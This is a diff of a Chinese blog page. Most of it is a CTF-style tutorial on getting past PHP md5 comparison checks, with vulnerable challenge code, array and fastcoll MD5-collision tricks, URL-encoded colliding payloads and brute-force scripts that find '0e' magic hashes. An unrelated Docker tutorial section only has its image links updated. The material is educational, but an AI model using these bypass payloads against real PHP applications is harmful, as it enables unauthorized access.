+<h2 id="比较-1"><a href="#比较-1" class="headerlink" title="===比较"></a>===比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>也可以传入两个数组，但不再适合传入两个0e开头的字符串，因为===是md5的强碰撞，进行了严格的过滤。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/7.png"></p>
+<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>使用md5加密后两个完全相等的两个字符串来绕过过滤。</p>
+<p>如何生成两个不一样的字符串，但是MD5是一样的呢。参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a>后，我们可以使用快速MD5碰撞生成器来构建两个MD5一样，但内容完全不一样的字符串。</p>
+<p><a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe.zip</a>  </p>
+<h4 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h4><p>创建一个文本文件，写入任意的文件内容，命名为ywj.txt （源文件）</p>
+<p>运行fastcoll输出以下参数。-p 是源文件，-o是输出文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p ywj.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/8.png"></p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>对生产的1.txt和2.txt文件进行测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. md5( (readmyfile(<span class="string">&quot;1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. urlencode(readmyfile(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.md5( (readmyfile(<span class="string">&quot;2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  urlencode(readmyfile(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，1.txt和2.txt文件二进制md5加密后的结果完全相同。由于1.txt和2.txt文件中含有不可见字符，所以需要将其url编码后使用。可以看到url编码后的两个字符串不完全相同，满足我们输入两个不同参数的需要。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/9.png"></p>
+<p>当题目限制不能传入数组，只能传入字符串时，如下例题，就只能采用解法2.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="string">&#x27;a&#x27;</span>])===md5($_GET[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HECTF-ezphp"><a href="#HECTF-ezphp" class="headerlink" title="HECTF  ezphp"></a>HECTF  ezphp</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">            $md5_1 = md5($string_1); </span><br><span class="line">            $md5_2 = md5($string_2); </span><br><span class="line">            <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">                $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> $flag;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先查看一些strtr()函数的用法：</p>
+<p>strtr() 函数转换字符串中特定的字符。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/10.png"></p>
+<p>观察源码，要求传入四个参数，首先param1===param2,因为没有别的限制，所以我们可以传入两个数组。<br>对于是str1和str2，首先str1只能是数字，且最后$a == $b，但md5_1 != md5_2，所以我们不能传入两个md5加密后以0e开头的字符串。</p>
+<p>又因为会将md5加密后的str1和str2中的cxhp替换成0123，也就是说c会被替换成0，所以一个ce开头的字符串会被替换成0e开头的字符串。</p>
+<p>可以想到只要找到两个md5加密后是ce开头的字符串，或者一个md5加密后是ce开头的字符串，一个md5加密后是0e开头的字符串就可以绕过过滤。</p>
+<p>构造脚本</p>
+<p>这是一开始的脚本，返回值少，且执行速度慢。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>;$a&lt;=<span class="number">1000000000</span>;$a++)&#123;</span><br><span class="line">   $md5 = md5($a);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^ce\d+$/&#x27;</span>,$md5))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/11.png" alt="16"></p>
+<p>这是进一步优化的脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a = <span class="number">1</span>; $a &lt;= <span class="number">100000000</span>; $a++) &#123;</span><br><span class="line">   $md5 = strtr(md5($a),<span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/12.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/13.png"></p>
+<h2 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    $a = rand(<span class="number">133</span>,<span class="number">600</span>)*<span class="number">78</span>;</span><br><span class="line">    $b = rand(<span class="number">18</span>,<span class="number">195</span>);</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$r = random();</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;a&#x27;</span>]==(<span class="keyword">string</span>)md5($_GET[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($a.$r == $b) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Yes,you are right&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察代码，有一个rondom方法，返回的是一个随机数，在这道题中，不需要清楚返回的是什么内容，我们只要知道返回的是一串数字就可以了。传入两个参数a和b，要求传入的是字符串，b会经过md5加密。最后要让$a.$r == $b。因为是弱类型比较，且只能传入字符串，想要的是两个0e开头的字符串进行比较，前面我们已经知道，以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0。所以保证$a以0e开头就可以了，因为$r是一串数字，所以$a.$r在php中还是可以被解析为0。因为$b是参数b经过md5加密而来，所以我们传入md5加密后是0e开头的字符串即可。</p>
+<p><img src="images%5C14.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/01/30/cat/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -365,7 +659,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-23 14:04:47" itemprop="dateModified" datetime="2020-12-23T14:04:47+08:00">2020-12-23</time>
+                <time title="修改时间：2021-03-21 16:08:19" itemprop="dateModified" datetime="2021-03-21T16:08:19+08:00">2021-03-21</time>
               </span>
 
           <br>
@@ -393,7 +687,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="Docker的思想"><a href="#Docker的思想" class="headerlink" title="Docker的思想"></a>Docker的思想</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/12.png"></p>
+          <h3 id="Docker的思想"><a href="#Docker的思想" class="headerlink" title="Docker的思想"></a>Docker的思想</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/1.png"></p>
 <h4 id="集装箱"><a href="#集装箱" class="headerlink" title="集装箱"></a>集装箱</h4><p>会将所有需要的内容放到不同的集装箱中，谁需要这些环境就直接拿到这个集装箱就可以了。</p>
 <h4 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h4><p>运输的标准化：Docker有一个码头，所有上传的集装箱都放在了这个码头上，当谁需要某一个环境，就直接到码头搬运这个集装箱即可。</p>
 <p>命令的标准化：Docker提供了一些标准化命令，帮助我们去获取集装箱等等操作。</p>
@@ -434,20 +728,20 @@
 <p>2，执行从上到下顺序执行</p>
 <p>3，#表示注释</p>
 <p>4，每一个指令都会创建提交一个新的镜像层，并提交</p>
-<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1982640279,3003728739&fm=26&gp=0.jpg"></p>
-<p><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=3110578388,151041081&fm=26&gp=0.jpg"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/2.jpg"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/3.jpg"></p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1,编写自己的Dockfile文件</span></span><br><span class="line"><span class="keyword">FROM</span>  centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line">RUM yum -y install vim</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2，通过这个文件构建镜像</span></span><br><span class="line">docker bulid -f dockerfile文件路径 -t 创建的镜像名:[tag] .</span><br><span class="line"></span><br><span class="line"><span class="comment">#3，测试运行</span></span><br></pre></td></tr></table></figure>
 
 
 
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[root@iz88m0zba2pfzdz dockerfile]<span class="comment"># docker build -f mydocker -t mycentos:0.1 .</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">27.65</span>kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">8</span> : <span class="keyword">FROM</span>  centos                   <span class="comment">#执行dockerfile第一行</span></span><br><span class="line">latest: Pulling <span class="keyword">from</span> library/centos       <span class="comment">#拉取官方的centos镜像</span></span><br><span class="line"><span class="number">7</span>a0437f04f83: Pull complete </span><br><span class="line">Digest: sha256:<span class="number">5528</span>e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1</span><br><span class="line">Status: Downloaded newer image for centos:latest</span><br><span class="line"> ---&gt; <span class="number">300</span>e315adb2f</span><br><span class="line">Step <span class="number">2</span>/<span class="number">8</span> : <span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"> ---&gt; Running in <span class="number">6</span>fed6811727f</span><br><span class="line">Removing intermediate container <span class="number">6</span>fed6811727f</span><br><span class="line"> ---&gt; <span class="number">428884</span>ab35bb</span><br><span class="line">Step <span class="number">3</span>/<span class="number">8</span> : <span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"> ---&gt; Running in e3f315c1c37c</span><br><span class="line">Removing intermediate container e3f315c1c37c</span><br><span class="line"> ---&gt; ddbb9ad846b0</span><br><span class="line">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">35</span>a1e3ceba27</span><br><span class="line">Removing intermediate container <span class="number">35</span>a1e3ceba27</span><br><span class="line"> ---&gt; d7d770769889</span><br><span class="line">Step <span class="number">5</span>/<span class="number">8</span> : <span class="keyword">RUN</span><span class="bash"> yum -y install vim          <span class="comment">#下载vim</span></span></span><br><span class="line"> ---&gt; Running in f119b2fc3459</span><br><span class="line">CentOS Linux <span class="number">8</span> - AppStream                      <span class="number">2.2</span> MB/s | <span class="number">6.3</span> MB     <span class="number">00</span>:<span class="number">02</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - BaseOS                         <span class="number">1.2</span> MB/s | <span class="number">2.3</span> MB     <span class="number">00</span>:<span class="number">01</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - Extras                         <span class="number">9.2</span> kB/s | <span class="number">8.6</span> kB     <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">Dependencies resolved.</span><br><span class="line"> <span class="keyword">From</span>       : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial</span><br><span class="line">Key imported successfully</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-<span class="number">1.20</span>.<span class="number">7</span>-<span class="number">15</span>.el8.x86_64         vim-common-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64    </span><br><span class="line">  vim-enhanced-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64 vim-filesystem-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.noarch</span><br><span class="line">  which-<span class="number">2.21</span>-<span class="number">12</span>.el8.x86_64             </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container f119b2fc3459</span><br><span class="line"> ---&gt; <span class="number">492</span>b0e9bfd9f</span><br><span class="line">Step <span class="number">6</span>/<span class="number">8</span> : <span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"> ---&gt; Running in ea437f060be5</span><br><span class="line">Removing intermediate container ea437f060be5</span><br><span class="line"> ---&gt; <span class="number">7</span>b1ffe6341bf</span><br><span class="line">Step <span class="number">7</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">2</span>a3e3fb9e634</span><br><span class="line">Removing intermediate container <span class="number">2</span>a3e3fb9e634</span><br><span class="line"> ---&gt; cadb8d02b5fc</span><br><span class="line">Step <span class="number">8</span>/<span class="number">8</span> : <span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"> ---&gt; Running in <span class="number">485</span>a50d91473</span><br><span class="line">Removing intermediate container <span class="number">485</span>a50d91473</span><br><span class="line"> ---&gt; d7dde5695515</span><br><span class="line">Successfully built d7dde5695515</span><br><span class="line">Successfully tagged mycentos:<span class="number">0.1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/11.png" alt="11"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/4.png" alt="11"></p>
 <h3 id="Docker文件存储"><a href="#Docker文件存储" class="headerlink" title="Docker文件存储"></a>Docker文件存储</h3><p>docker文件存储格式，linux的一个存储技术，叫做联合文件系统，是一种分层的文件系统，可以将不同的目录挂到同一个虚拟文件系统下。</p>
 <p>比如test1下有三个文件夹,test2下有两个文件夹,还有一个readme文件.联合文件系统就是可以在一个文件夹(test)中看到多个文件夹(test1,test2)中的内容.</p>
-<p><img src="https://img-blog.csdnimg.cn/20190525114311818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E2MTAzNzY2ODE=,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/5.png"></p>
 <p>docker镜像系统的每一层都是只读的,然后把每一层加载完成之后这些文件都会被看成是同一个目录,相当于只有一个文件系统.docker的这种文件系统被称之为镜像.</p>
-<p><img src="https://img.jbzj.com/file_images/article/201905/2019052011592426.jpg"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/6.jpg"></p>
 
       
     </div>
@@ -798,10 +1092,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-11-29 12:51:41 / 修改时间：16:33:32" itemprop="dateCreated datePublished" datetime="2020-11-29T12:51:41+08:00">2020-11-29</time>
+              <time title="创建时间：2020-11-29 12:51:41" itemprop="dateCreated datePublished" datetime="2020-11-29T12:51:41+08:00">2020-11-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-21 16:10:02" itemprop="dateModified" datetime="2021-03-21T16:10:02+08:00">2021-03-21</time>
+              </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -974,7 +1274,7 @@
 <p>swap分区（虚拟内存），一般不超过2GB</p>
 <p>推荐分区      /boot (启动分区，200MB)  如果不分该区的话，默认存储在根目录下。</p>
